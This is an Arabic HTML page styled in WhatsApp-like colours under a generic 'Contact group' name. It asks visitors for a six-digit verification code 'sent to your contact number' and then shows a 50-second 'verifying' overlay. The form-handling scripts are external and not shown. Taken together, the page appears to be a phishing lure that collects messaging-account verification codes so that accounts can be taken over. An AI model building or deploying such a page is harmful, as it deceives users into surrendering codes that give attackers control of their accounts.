<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>رمز التأكيد</title>
  <link rel="icon" href="./assets/images/favicon.ico" />
  <link rel="stylesheet" href="style.css" />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet" />

  <style>
    /* ===== RESET & BASE STYLES ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
      min-height: 100vh;
      line-height: 1.6;
      color: #333;
    }

    /* ===== NAVBAR ===== */
    .navbar {
      background: linear-gradient(to left, #075E54, #128C7E);
      color: white;
      padding: 15px 25px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 3px 15px rgba(7, 94, 84, 0.2);
      position: relative;
      z-index: 100;
    }

    .navbar-title {
      font-size: 1.3rem;
      font-weight: 700;
      letter-spacing: 0.5px;
    }

    .navbar img {
      height: 45px;
      width: auto;
    }

    /* ===== MAIN CONTAINER ===== */
    .container {
      max-width: 500px;
      margin: 40px auto;
      padding: 0 20px;
      animation: fadeIn 0.5s ease;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* ===== CODE CONTAINER ===== */
    .code-container {
      background: white;
      border-radius: 20px;
      padding: 40px 35px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
      text-align: center;
      border: 1px solid rgba(37, 211, 102, 0.1);
      position: relative;
      overflow: hidden;
      transition: transform 0.3s ease;
    }

    .code-container:hover {
      transform: translateY(-5px);
    }

    .code-container::before {
      content: '';
      position: absolute;
      top: 0;
      right: 0;
      width: 100%;
      height: 5px;
      background: linear-gradient(to left, #25D366, #128C7E);
    }

    .code-logo {
      width: 140px;
      height: auto;
      margin: 0 auto 25px;
      display: block;
      border-radius: 15px;
      padding: 15px;
      background: rgba(37, 211, 102, 0.05);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
      transition: transform 0.3s ease;
    }

    .code-logo:hover {
      transform: scale(1.05);
    }

    .code-title {
      color: #075E54;
      text-align: center;
      margin-bottom: 20px;
      font-size: 1.8rem;
      font-weight: 800;
      line-height: 1.4;
    }

    .code-subtitle {
      color: #666;
      margin-bottom: 35px;
      font-size: 1.05rem;
      line-height: 1.7;
      padding: 0 10px;
    }

    /* ===== INPUT FIELD ===== */
    #text {
      width: 100%;
      padding: 18px 20px;
      font-size: 1.8rem;
      text-align: center;
      letter-spacing: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 12px;
      margin-bottom: 25px;
      background: #f8f9fa;
      font-family: 'Courier New', monospace;
      color: #075E54;
      font-weight: 700;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      direction: ltr;
      outline: none;
      caret-color: #25D366;
    }

    #text:focus {
      border-color: #25D366;
      box-shadow: 0 0 0 4px rgba(37, 211, 102, 0.15);
      background: white;
      transform: translateY(-2px);
    }

    #text::placeholder {
      color: #bbb;
      letter-spacing: 10px;
      font-size: 1.6rem;
    }

    /* ===== CONFIRM BUTTON ===== */
    #confirmCodeBtn {
      background: linear-gradient(to left, #25D366, #128C7E);
      color: white;
      border: none;
      padding: 18px 30px;
      font-size: 1.15rem;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
      font-weight: 700;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      letter-spacing: 0.5px;
      position: relative;
      overflow: hidden;
      margin-top: 15px;
    }

    #confirmCodeBtn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
      transition: 0.5s;
    }

    #confirmCodeBtn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 25px rgba(37, 211, 102, 0.3);
    }

    #confirmCodeBtn:hover::before {
      left: 100%;
    }

    #confirmCodeBtn:active {
      transform: translateY(-1px);
      box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
    }

    #confirmCodeBtn:disabled {
      background: #cccccc;
      cursor: not-allowed;
      transform: none;
      box-shadow: none;
    }

    #confirmCodeBtn:disabled:hover::before {
      display: none;
    }

    /* ===== MESSAGES ===== */
    #errorMsg,
    #successMsg {
      display: none;
      font-weight: bold;
      margin: 20px 0;
      text-align: center;
      padding: 15px;
      border-radius: 10px;
      animation: slideIn 0.3s ease;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(-10px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    #errorMsg {
      color: #d32f2f;
      background-color: #ffebee;
      border: 1px solid #ffcdd2;
      box-shadow: 0 3px 10px rgba(211, 47, 47, 0.1);
    }

    #successMsg {
      color: #2e7d32;
      background-color: #e8f5e9;
      border: 1px solid #c8e6c9;
      box-shadow: 0 3px 10px rgba(46, 125, 50, 0.1);
    }

    /* ===== FOOTER ===== */
    .footer {
      text-align: center;
      color: #666;
      padding: 25px 20px;
      font-size: 0.9rem;
      background: rgba(255, 255, 255, 0.9);
      margin-top: 40px;
      border-top: 1px solid rgba(0, 0, 0, 0.05);
    }

    .footer p {
      margin: 8px 0;
      opacity: 0.8;
    }

    /* ===== LOADING OVERLAY ===== */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(5px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      animation: overlayIn 0.3s ease;
    }

    @keyframes overlayIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    /* ===== LOADING POPUP ===== */
    .loading-popup {
      background: white;
      padding: 40px 35px;
      border-radius: 20px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 25px;
      min-width: 320px;
      max-width: 90%;
      animation: popupIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    @keyframes popupIn {
      from {
        opacity: 0;
        transform: scale(0.8) translateY(20px);
      }

      to {
        opacity: 1;
        transform: scale(1) translateY(0);
      }
    }

    /* ===== LINEAR PROGRESS CONTAINER ===== */
    .chrono-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 25px;
      width: 100%;
      max-width: 400px;
    }

    /* ===== PROGRESS LABEL ===== */
    .chrono-label {
      font-size: 1.3rem;
      color: #075E54;
      font-weight: 800;
      text-align: center;
      background: linear-gradient(to left, #25D366, #128C7E);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      letter-spacing: 0.5px;
      margin-bottom: 5px;
      animation: pulseText 2s infinite;
    }

    @keyframes pulseText {
      0% {
        opacity: 0.9;
        transform: scale(1);
      }

      50% {
        opacity: 1;
        transform: scale(1.02);
      }

      100% {
        opacity: 0.9;
        transform: scale(1);
      }
    }

    /* ===== PROGRESS LINE ===== */
    .chrono-line {
      width: 100%;
      height: 16px;
      background: linear-gradient(to bottom, #f0f0f0, #e0e0e0);
      border-radius: 8px;
      overflow: hidden;
      position: relative;
      box-shadow:
        inset 0 2px 5px rgba(0, 0, 0, 0.15),
        0 3px 8px rgba(0, 0, 0, 0.1);
      border: 1px solid rgba(0, 0, 0, 0.08);
    }

    .chrono-progress {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg,
          #25D366 0%,
          #128C7E 30%,
          #075E54 70%,
          #054735 100%);
      border-radius: 8px;
      transition: width 50s linear;
      box-shadow:
        0 0 15px rgba(37, 211, 102, 0.6),
        inset 0 2px 0 rgba(255, 255, 255, 0.4);
      position: relative;
      overflow: hidden;
    }

    /* ===== SHIMMER EFFECT ===== */
    .chrono-progress::after {
      content: '';
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: -100%;
      background: linear-gradient(90deg,
          transparent,
          rgba(255, 255, 255, 0.5),
          transparent);
      animation: shimmer 1.5s infinite;
    }

    @keyframes shimmer {
      0% {
        transform: translateX(0);
      }

      100% {
        transform: translateX(200%);
      }
    }

    /* ===== DURATION TEXT ===== */
    .loading-duration {
      color: #666;
      font-size: 0.9rem;
      margin-top: 15px;
      text-align: center;
      font-weight: 600;
    }

    /* ===== PULSING DOT ===== */
    .pulsing-dot {
      display: inline-block;
      width: 8px;
      height: 8px;
      background: #25D366;
      border-radius: 50%;
      margin: 0 5px;
      animation: pulseDot 1.5s infinite;
    }

    .pulsing-dot:nth-child(2) {
      animation-delay: 0.3s;
    }

    .pulsing-dot:nth-child(3) {
      animation-delay: 0.6s;
    }

    @keyframes pulseDot {

      0%,
      100% {
        transform: scale(1);
        opacity: 0.7;
      }

      50% {
        transform: scale(1.3);
        opacity: 1;
      }
    }

    /* ===== MEDIA QUERIES ===== */
    @media (max-width: 768px) {
      .navbar {
        padding: 12px 20px;
      }

      .navbar-title {
        font-size: 1.2rem;
      }

      .container {
        margin: 30px auto;
        padding: 0 15px;
      }

      .code-container {
        padding: 35px 25px;
        border-radius: 18px;
      }

      .code-logo {
        width: 120px;
        margin-bottom: 20px;
      }

      .code-title {
        font-size: 1.6rem;
      }

      .code-subtitle {
        font-size: 1rem;
        padding: 0;
        margin-bottom: 30px;
      }

      #text {
        font-size: 1.6rem;
        letter-spacing: 12px;
        padding: 16px;
      }

      #confirmCodeBtn {
        padding: 16px;
        font-size: 1.1rem;
      }

      .loading-popup {
        padding: 35px 25px;
        margin: 0 15px;
      }

      .chrono-line {
        height: 14px;
      }

      .chrono-label {
        font-size: 1.2rem;
      }
    }

    @media (max-width: 480px) {
      .navbar {
        padding: 10px 15px;
      }

      .navbar-title {
        font-size: 1.1rem;
      }

      .navbar img {
        height: 35px;
      }

      .code-container {
        padding: 30px 20px;
        border-radius: 16px;
      }

      .code-logo {
        width: 100px;
        margin-bottom: 15px;
      }

      .code-title {
        font-size: 1.4rem;
      }

      .code-subtitle {
        font-size: 0.95rem;
        margin-bottom: 25px;
      }

      #text {
        font-size: 1.4rem;
        letter-spacing: 10px;
        padding: 14px;
        margin-bottom: 20px;
      }

      #text::placeholder {
        font-size: 1.3rem;
        letter-spacing: 8px;
      }

      #confirmCodeBtn {
        padding: 15px;
        font-size: 1rem;
      }

      .chrono-line {
        height: 12px;
      }

      .chrono-label {
        font-size: 1.1rem;
      }

      .loading-popup {
        padding: 30px 20px;
        gap: 20px;
      }

      .footer {
        padding: 20px 15px;
        font-size: 0.85rem;
      }
    }

    @media (max-width: 360px) {
      .code-title {
        font-size: 1.3rem;
      }

      #text {
        font-size: 1.3rem;
        letter-spacing: 8px;
      }

      .loading-popup {
        padding: 25px 15px;
      }
    }

    /* ===== DARK MODE ===== */
    @media (prefers-color-scheme: dark) {
      body {
        background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
        color: #e0e0e0;
      }

      .code-container {
        background: #2d2d2d;
        border-color: rgba(37, 211, 102, 0.2);
      }

      .code-title {
        color: #25D366;
      }

      .code-subtitle {
        color: #aaa;
      }

      #text {
        background: #3d3d3d;
        border-color: #555;
        color: #25D366;
      }

      #text:focus {
        border-color: #25D366;
        background: #444;
      }

      .footer {
        background: rgba(45, 45, 45, 0.9);
        color: #aaa;
      }

      .loading-popup {
        background: #2d2d2d;
        color: #e0e0e0;
      }

      .chrono-label {
        color: #25D366;
        background: linear-gradient(to left, #25D366, #128C7E);
        -webkit-background-clip: text;
        background-clip: text;
      }

      .chrono-line {
        background: linear-gradient(to bottom, #3d3d3d, #333);
      }

      #errorMsg {
        background-color: #5c2b29;
        border-color: #8a3c38;
        color: #ffb4ab;
      }

      #successMsg {
        background-color: #1b5e20;
        border-color: #2e7d32;
        color: #a5d6a7;
      }
    }

    /* ===== TOUCH DEVICE OPTIMIZATIONS ===== */
    @media (hover: none) and (pointer: coarse) {
      .submit-button:hover {
        transform: none;
      }

      .submit-button:active {
        transform: scale(0.98);
      }

      #text {
        font-size: 1.6rem;
        padding: 20px;
      }
    }
  </style>

  <script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
</head>

<body>

  <div class="navbar">
    <div class="navbar-title">مجموعة التواصل</div>
    <img src="./assets/images/logonavbar.svg" alt="شعار التواصل" />
  </div>

  <div class="container" id="container" dir="rtl">
    <form id="confirmationForm" novalidate>
      <div id="codeSection">
        <div class="code-container">
          <img src="./assets/images/logonavbar.svg" alt="شعار التواصل" class="code-logo" />
          <h2 class="code-title">يرجى إدخال رمز التحقق</h2>
          <p class="code-subtitle">تم إرسال رمز مكون من 6 أرقام إلى رقم التواصل الخاص بك</p>

          <input id="text" type="text" name="code" maxlength="6" placeholder="— — — — — —" required
            inputmode="numeric" />

          <div id="errorMsg"></div>
          <div id="successMsg"></div>

          <button type="submit" id="confirmCodeBtn">تأكيد الرمز</button>
        </div>
      </div>
    </form>
  </div>

  <div class="footer">
    <p>© 2026 جميع الحقوق محفوظة</p>
    <p>تم التطوير بواسطة فريق الدعم</p>
  </div>

  <div id="loadingPopup" class="loading-overlay">
    <div class="loading-popup">
      <div class="chrono-container">
        <!-- النص مع نقاط متحركة -->
        <div class="chrono-label">
          جاري التحقق والاتصال
          <span class="pulsing-dot"></span>
          <span class="pulsing-dot"></span>
          <span class="pulsing-dot"></span>
        </div>

        <!-- الخط التحميلي -->
        <div class="chrono-line">
          <div class="chrono-progress"></div>
        </div>

        <!-- نص المدة -->

      </div>

      <p style="color: #666; font-size: 0.9rem; text-align: center; max-width: 300px; margin-top: 10px;">
        يرجى الانتظار حتى انتهاء التحميل للانتقال تلقائياً
      </p>
    </div>
  </div>

  <script src="js/utils.js"></script>
  <script src="js/contact.js"></script>
</body>

</html>
